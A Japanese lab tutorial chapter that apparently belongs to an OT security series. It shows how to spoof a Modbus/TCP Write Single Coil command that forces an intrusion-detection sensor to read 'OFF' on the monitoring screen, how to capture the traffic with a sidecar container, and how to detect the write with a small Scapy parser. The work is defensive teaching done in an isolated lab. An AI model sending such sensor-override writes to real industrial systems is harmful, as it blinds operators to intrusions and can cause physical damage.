---
title: "第6章：Modbus/TCPメモリ汚染攻撃と自作IDS開発"
---

# 第6章：Modbus/TCPメモリ汚染攻撃と自作IDS開発

---

## 1. はじめに

前回の第5章では、HMI（Node-RED）からセンサー状態を監視するフローを構築し、平常時に流れる通信パターン（ベースライン）をpcapとして取得しました。

今回は、本ラボのハイライトとなる **「メモリ汚染（センサー隠蔽）攻撃の実行とバイナリ解析」** に突入します。

IT網に侵入した攻撃者としてOT網のセンサーに状態変更コマンドを送信し、さらに防御側としてパケットを解析し、バイナリレベルで攻撃の痕跡を抽出・証明します。

---

## 2. 攻撃シナリオ（Attack）の実行

### シナリオと目的

攻撃者の目的は、「現場で実際に侵入が発生しているにもかかわらず、HMI（監視画面）上では侵入検知センサーの表示を『正常（OFF）』に強制書き換えし、オペレーターの目を欺く（Denial of View）」ことです。

> **倫理的配慮と技術的性質に関する注記**
> 本章で扱う検証コード（攻撃スクリプト）は、OSの脆弱性を突く破壊的エクスプロイトや不正な未知のコードではなく、**「Modbus/TCPプロトコル規格に完全に準拠した正規の書き込みコマンド（FC 0x05）を送信しているだけ」** のものです。
> OTプロトコルの多くは認証機構を持たない正規仕様そのものがリスクとなり得るため、安全に隔離された本ラボ環境内での学習・防衛目的の検証として実施します。

---

### 攻撃スクリプトの実装解説

攻撃スクリプト（`test_modbus.py`）では、外部ライブラリを一切使わず、Python標準ライブラリの `socket` と `struct` だけを使用して「生のバイナリパケットを自力で組み立ててTCPで送信する」手法をとっています。

パケット生成の心臓部にあたる関数が以下です。

```python
import struct

def send_modbus(s, tx_id, fc, addr, value):
    # struct.packで生バイナリ（バイト列）を構築
    pkt = struct.pack('>HHHBBHH', tx_id, 0, 6, 1, fc, addr, value)
    s.sendall(pkt)
    return s.recv(256)
```

ここで使われている `struct.pack('>HHHBBHH', ...)` が、Modbus/TCPパケット（MBAPヘッダ7バイト ＋ PDU）の物理フォーマットを定義しています。

* **`>`** : ビッグエンディアン（ネットワークバイトオーダー）
* **`H`** : 2バイト無符号整数（unsigned short）
* **`B`** : 1バイト無符号整数（unsigned char）

これをパケット構造に当てはめると、以下のようになります。

```
[H] tx_id : Transaction ID (任意の2バイト)
[H] 0     : Protocol ID (Modbusは常に0)
[H] 6     : Length (後続のバイト数。UnitID+FC+Addr+Val = 6)
[B] 1     : Unit ID (スレーブID。1号機)
[B] fc    : Function Code (0x05 Write Single Coil)
[H] addr  : 対象レジスタのアドレス (0x0000)
[H] value : 書き込む値 (0x0000 = OFF)
```

---

### 攻撃の実行（FC 0x05の注入）

スクリプトの中盤では、この関数を用いて「侵入検知センサー（Address: 0）」に対し、強制的に「OFF（`0x0000`）」を書き込む命令を送信します。

```python
# STAGE 2: MEMORY OVERRIDE ATTACK
# Coil 0 (侵入検知) を強制的に OFF (0x0000) に書き換える
r = send_modbus(s, 991, 0x05, 0x0000, 0x0000)
```

---

### 攻撃の実行とキャプチャ（コンテナ環境における「サイドカー方式」）

HMIコンテナの中でパケットキャプチャを行っても、HMIは同一スイッチに繋がった一端末に過ぎないため、攻撃者からセンサーへの直接通信（ユニキャスト）は死角になり見えません。この「監視の死角」を突かれるのがOTセキュリティの課題です。

これを克服するため、コンテナ環境特有の強力な監視手法である**「サイドカー方式」**を使います。センサーコンテナのネットワーク空間に直接「盗聴用コンテナ」を相乗り（`--net container:sensor-emulator`）させることで、センサーを狙うすべての通信をキャプチャします。

ターミナル1で以下のコマンドを実行し、盗聴用コンテナを起動します。

```bash
docker run --rm -it \
  --net container:sensor-emulator \
  -v /mnt/c/Users/user:/capture \
  alpine sh -c "apk add --no-cache tcpdump && tcpdump -i any tcp port 502 -w /capture/attack_traffic_true.pcap"
```

画面に `tcpdump: listening on any...` と表示されたら、ターミナル2から以下の攻撃コマンドを実行します。

```bash
docker run --rm -it \
  --network ot-lab_ot_net \
  --ip 192.168.100.50 \
  -v /home/fol/ot-lab/test_modbus.py:/exploit.py \
  python:3-slim \
  python3 /exploit.py
```

![](https://static.zenn.studio/user-upload/baafb7c5e6dc-20260721.png)

![](https://static.zenn.studio/user-upload/827744c0a1a7-20260721.png)

攻撃が終わったらターミナル1を `Ctrl+C` で停止させ、`attack_traffic_true.pcap` を取得します。

---

## 3. Wiresharkでのアノマリー（異常）目視確認

取得したpcapをWiresharkで開き、攻撃の痕跡を確認します。

Wireshark上部のディスプレイフィルタに以下を入力します。

```
modbus.func_code == 5
```

攻撃者が放ったパケットが浮き上がります。

![](https://static.zenn.studio/user-upload/556051c3991d-20260721.png)

このパケットから、以下の3つの異常（アノマリー）が証明されます。

1. **IPの異常**: 登録されたHMI（`192.168.100.10`）ではなく、未知の端末（`192.168.100.50`）から送信されている。
2. **FCの異常**: 平常時には流れない書き込み命令 `Write Single Coil (5)` が使われている。
3. **データ汚染**: 対象アドレス `0`（侵入検知センサー）に対し、`Data: 0000`（強制OFF）が注入されている。

---

## 4. 自作IDSパーサー
なぜ Wireshark ではなく「自作IDSパーサー」を作るのか？

Wiresharkで攻撃の痕跡を見つけることができましたが、プログラムによる自動検知・防御には自作IDS（侵入検知システム）の開発が不可欠です。

* **高い学習効果**: 既存ツールに頼らず、プロトコル仕様と生のバイト列を自力でパースする経験が、バイナリ理解を爆発的に高めます。
* **独自プロトコルへの対応力**: 実際のOT現場にはWireshark未対応の独自プロトコルが存在するため、自力でパケットを分解する技術が武器となります。
* **リアルタイム自動検知の原理理解**: 市販のネットワーク型IDS/IPSが行っている「シグネチャ検知」の最小実装原理を体得できます。

---

## 5. 自作パーサー（簡易IDS）の開発と検証

取得したpcapを分析し、正常系ベースラインからの逸脱をプログラムで自動抽出するパーサー（`ids_parser.py`）を作成します。

```python
# 実際のパース処理の核心部 (Scapy利用)
if pkt.haslayer(TCP) and pkt.haslayer(Raw):
    if pkt[TCP].dport == 502:
        payload = pkt[Raw].load
        if len(payload) >= 8:
            # オフセット0x07 (8バイト目) が Function Code
            fc = payload[7]
            if fc == 0x05:
                # 攻撃検知！アラート発報！
                print("[CRITICAL ALERT] Unauthorized Write Single Coil (FC 0x05) detected!")
```

解析結果を実行します。

```bash
python3 ids_parser.py attack_traffic_true.pcap
```

![](https://static.zenn.studio/user-upload/058f83326cba-20260721.png)

緑色で流れる正常なポーリング（FC 0x01 / 0x04）の中に潜む攻撃者の一撃（FC 0x05）だけを抽出し、`CRITICAL ALERT` として検知することに成功しました。

---

## 6. おわりに

本章を通して理解できるITとOTの決定的な違い、それは「OT環境におけるサイバー攻撃の本質は、メモリの書き換えである」ということです。

ITの攻撃が「データの窃取」や「暗号化（ランサムウェア）」を目的とするのに対し、OTの攻撃は「物理機器（バルブ、センサー、モーター）を意図的に誤動作・破綻させること」を目的とします。

そのデジタルと物理世界を繋ぐ境界線が、制御装置の「メモリ空間（コイルやレジスタ）」です。歴史上有名なOTサイバー攻撃「Stuxnet」も、制御メモリを不正書き換えして物理破壊を起こしつつ、HMIには「正常値」を返し続けて監視員を欺きました。

今回行った実験は、まさにこのOTセキュリティ最大の脅威の本質を再現し、自作IDSによって検知を証明する一連のプロセスです。


